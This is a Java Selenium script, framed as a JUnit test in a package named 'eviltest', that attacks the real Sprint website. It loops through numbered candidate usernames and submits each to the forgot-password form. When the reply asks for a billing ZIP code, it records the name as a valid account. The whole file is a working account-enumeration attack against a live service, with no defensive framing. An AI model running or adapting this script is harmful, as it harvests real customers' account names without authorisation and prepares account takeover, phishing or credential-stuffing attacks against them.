package com.eviltest.webdriver;

import org.junit.Test;
import org.junit.runner.JUnitCore;
import org.junit.runner.Result;
import com.eviltest.utility.*;
import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.remote.DesiredCapabilities;

import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.concurrent.TimeUnit;

import static com.eviltest.utility.Utility.guardarUsuario;
import static java.lang.Thread.sleep;

public class EvilSprintTest {

    @Test
    private static void SprintTest(String usuario, int desde, int hasta) {
        //if you didn't update the Path system variable to add the full directory path to the executable as above mentioned then doing this directly through code
        System.setProperty("webdriver.gecko.driver", "utility/driver/geckodriver.exe");
        //Now you can Initialize marionette driver to launch firefox
        DesiredCapabilities capabilities = DesiredCapabilities.firefox();
        capabilities.setCapability("marionette", true);
        while (desde != hasta) {
            desde++;
            String usuarioActual = usuario + desde;

            WebDriver driver = new FirefoxDriver();

            try {

                driver.manage().timeouts().implicitlyWait(10, TimeUnit.SECONDS);

                driver.navigate().to("https://www.sprint.com/");

                sleep(5);
                driver.findElement(By.id("tl-menu-signin")).click();
                sleep(5);
                driver.findElement(By.id("txtLoginUsernameDL")).sendKeys(usuarioActual);
                sleep(8);
                driver.findElement(By.id("forgotPassword")).click();
                sleep(10);
                driver.findElement(By.id("txtForgotPasswordUsername")).sendKeys(usuarioActual);
                sleep(5);
                driver.findElement(By.id("btnForgotPasswordSubmit")).click();
                sleep(5);
                String formulario = driver.findElement(By.className("accountForgotleft")).getText();
                System.out.println(formulario);

                if ((formulario.contains("Billing ZIP code") & (formulario.contains("ZIP")))) {
                    guardarUsuario(usuarioActual);

                } else {
                    System.out.println("EL USUARIO : " + desde + " NO ES VALIDO");

                }

            } catch (Exception e) {
                e.printStackTrace();

            } finally {
                try {
                    driver.close();
                    driver.quit();

                } catch (Exception e) {
                    e.printStackTrace();
                }


            }

        }
    }
}
